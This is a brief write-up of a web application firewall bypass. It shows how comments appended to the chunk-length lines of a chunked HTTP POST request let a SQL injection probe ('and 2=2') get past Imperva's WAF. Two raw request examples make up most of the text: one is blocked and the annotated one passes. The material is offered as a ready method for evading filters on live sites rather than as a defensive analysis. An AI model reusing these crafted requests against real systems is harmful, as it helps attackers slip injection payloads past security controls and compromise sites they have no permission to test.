Scramble chunked packets with annotations 

At this time, if you try to bypass the conventional chunked transmission method directly, Will be directly identified and blocked by WAF.      

Almost all WAFs that can identify a Transfer-Encoding packet, but some do not process the comment at the length identifier in the packet. As a result, if a comment is added to the packet, the WAF will not recognize the packet.    

Now we are testing regular block transfer packets on a website:   

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1
d
9
&a=1	and	
3
2=2
0
```
The returned results are shown in the following figure   
![Capture](https://user-images.githubusercontent.com/25066959/70383201-da9f7380-1937-11ea-9330-00ec7f5e30a2.PNG)
You can see that our attack payload "and 2 = 2" was intercepted by Imperva's WAF.    
At this time, we add the block transmission packet with a comment.    
```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1;testsdasdsad
d
9;test
&a=1	and	
3;test44444
2=2
0
```
The returned results are shown in the following figure.    
![Capture](https://user-images.githubusercontent.com/25066959/70383265-b7c18f00-1938-11ea-9633-35eee3316363.PNG)
You can see that the firewall has stopped intercepting this payload.